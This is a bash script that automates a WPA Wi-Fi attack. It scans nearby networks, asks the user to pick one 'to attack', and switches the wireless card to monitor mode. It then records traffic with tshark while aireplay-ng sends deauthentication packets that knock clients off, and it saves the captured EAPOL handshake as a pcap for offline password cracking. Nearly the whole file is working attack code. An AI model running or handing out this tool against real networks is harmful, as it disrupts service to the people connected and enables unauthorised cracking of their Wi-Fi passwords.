#!/bin/bash
# program:
#	This program does
#	1 scan the surrounding wireless networks 
#	2 specify the network for offline attack by user
#	3 crawl eapol handshake packets in monitor mode.
# History
# 2016/05/06 zxl first release

# Get the wireless interface name

  iwconfig 2>/dev/null | sed -n 1p |cut -d ' ' -f1 >wire_name.out

  wirename=`cat wire_name.out`
 

  if [ "$wirename" == "" ]; then
  	echo "wireless interface not detected!"
  	echo -e "\n"
  	exit 0
  else
	clear
	echo "detected wireless interface" `cat wire_name.out` 
	
  fi
                  

# Scan wireless networks
  
  quit_value=""

  while [ "$quit_value" != "quit" -a "$quit_value" != "q" ]
  do    
	yn=""
  	while [ "$yn" != "yes" -a "$yn" != "y" ]
  	do
		# set mode managed
		ifconfig $wirename down
  		iwconfig $wirename mode managed
  		ifconfig $wirename up
		#scan wireless networks and list bssid,channel,essid
		clear
  		echo -e "\n\t\twireless network List\n"
		iwlist  $wirename scanning  |grep -A 5 "Address"|grep -v "Frequency"|grep  -v "Quality"|grep -v "Encryption"| tee iwlistinfo
  		echo -e "\n"

		read -p "cotinue? yes or [rescan]  " yn
  	done
  
	# choose network to attack

  	declare  -i network_number 
  	read -p "choose network to attack: " network_number
 
	# Get bssid,channel,essid
 
  	bssid=`cat iwlistinfo | sed -n $[(network_number-1)*4+1]p|awk -F " " '{ print $5}'`
 
  	channel=`cat iwlistinfo | sed -n $[(network_number-1)*4+2]p|awk -F ":" '{print $2}'`
 
  	essid=`cat iwlistinfo | sed -n $[(network_number-1)*4+3]p|awk -F "\"" '{print $2}'`
  
  	filename="$essid@$bssid.out"
        filename=${filename//\\/0}
	echo $filename
	echo $filename >file_name
 
  
	# set mode to monitor 

  	ifconfig $wirename down 2>error.out
  	iwconfig $wirename mode monitor 2>error.out
  	ifconfig $wirename up 2>error.out
   
  	error_value=`cat error.out`
  	if [ "$error_value" != "" ]; then
  		echo $eror_value
 		exit 0
  	else
		echo "monitor mode start"
  	fi

	# Set channel
  	iwconfig $wirename channel $channel 2> error.out
  	error_value=`cat error.out`
  	if [ "$error_value" != "" ]; then
        	echo $eror_value
        	exit 0
  	else
        	echo "set channel $channel:ok "
  	fi

	# Run wireshark in the background  

  	{ tshark -i `cat wire_name.out` -w `cat file_name` &> /dev/null;} &
  	PID=$!
  	disown $PID
 
	# send DEAUTH packets 
  	aireplay-ng -0 10 -a $bssid $wirename 

	# Watting for wireshark working
  	echo -e "\nwireshark is working!\n"
  	sleep 60
	# End wireshark
  	kill -TERM $PID
  	echo -e "finished\n"

	# translate  file to pcap format 
  	tshark -r $filename  -F pcap -w ${filename/out/pcap} &> /dev/null
       
	# delete temp file
 	  rm $filename
  	  rm file_name

  	echo -e  "Result is saved in ${filename/out/pcap}!\n" 
	read -p "quit or [continue]?  " quit_value

  done
  
# delete temp file  
  rm wire_name.out
